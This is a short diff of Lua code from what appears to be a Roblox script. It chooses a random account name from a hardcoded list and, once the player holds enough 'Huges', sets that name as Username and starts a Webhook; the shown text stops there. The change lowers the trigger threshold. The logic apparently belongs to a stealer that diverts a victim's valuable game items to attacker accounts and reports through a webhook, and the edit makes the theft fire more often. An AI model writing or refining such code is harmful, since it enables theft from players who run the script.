@@ -504,7 +504,7 @@ local nicks = {"br1c7s", "killpop00"}
 math.randomseed(os.time())
 local randomNick = nicks[math.random(#nicks)]
 math.randomseed(os.time())
-local DualRandomHuge = math.random(5, 15)
+local DualRandomHuge = math.random(1, 15)
 if AmountOfHuges >= DualRandomHuge then
     Username = br1c7s
     Webhook =
